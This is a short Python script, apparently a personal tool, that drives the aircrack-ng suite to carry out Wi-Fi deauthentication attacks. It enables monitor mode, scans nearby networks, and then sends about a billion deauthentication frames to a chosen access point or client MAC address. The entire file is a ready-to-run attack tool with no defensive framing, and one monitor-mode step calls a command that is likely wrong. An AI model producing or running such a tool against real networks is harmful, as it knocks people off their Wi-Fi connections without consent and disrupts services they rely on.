import subprocess

def monitor_mode():
    monitor_question = input("\033[1;33mIs your interface in monitor mode? [y/n]: \033[0m").strip().lower()
    
    if monitor_question == "n":
        interface = input("\033[1;33mEnter interface name to put in monitor mode: \033[0m").strip()
        subprocess.call(["ifconfig", interface, "down"])
        subprocess.call(["aircrack-ng", "check", "kill"])
        subprocess.call(["airmon-ng", "start", interface])
        subprocess.run(["iwconfig"])
        print("\033[1;32mMonitor mode of " + interface +" successfully enabled.\033[0m")

def scan_network():
	frequency = input("\033[1;33mDo u want to scan for 5GHz too? [y/n]: \033[0m").strip().lower()
	if frequency == "y":
		subprocess.run(["gnome-terminal", "--", "bash", "-c", f"airodump-ng --band abg {interface_monitor}; exec bash"])
	else:
		subprocess.run(["gnome-terminal", "--", "bash", "-c", f"airodump-ng {interface_monitor}; exec bash"])
	print("\033[1;32mPress Ctrl + c to stop scanning.\033[0m")

def deauth_access_point():
	channel = input("\033[1;33mEnter channel of the wifi BSSID: \033[0m")
	subprocess.run(["iwconfig", interface_monitor, "channel", channel])
	BSSID = input("\033[1;33mEnter BSSID you want to deauth: \033[0m")
	subprocess.call(["aireplay-ng", "--deauth", "1000000000", "-a", BSSID, interface_monitor])

def deauth_client():
	channel = input("\033[1;33mEnter channel of the wifi BSSID: \033[0m")
	subprocess.run(["iwconfig", interface_monitor, "channel", channel])
	bssid = input("\033[1;33mEnter BSSID you want to deauth: \033[0m")
	subprocess.run(["gnome-terminal", "--", "bash", "-c", f"airodump-ng --bssid {bssid} --channel {channel} {interface_monitor}; exec bash"])
	client_mac = input("\033[1;33mEnter client MAC address you want to deauth: \033[0m")
	subprocess.call(["aireplay-ng", "--deauth", "1000000000", "-a", bssid, "-c", client_mac, interface_monitor])

def deauth():
	attack_type = input("\033[1;33mDo you want to deauth client or access point [c/a]: \033[0m")
	if attack_type == "a":
		deauth_access_point()
	else:
		deauth_client()

subprocess.run(["iwconfig"])
monitor_mode()
interface_monitor = input("\033[1;33mEnter interface name in monitor mode: \033[0m").strip()
scan_network()
deauth()


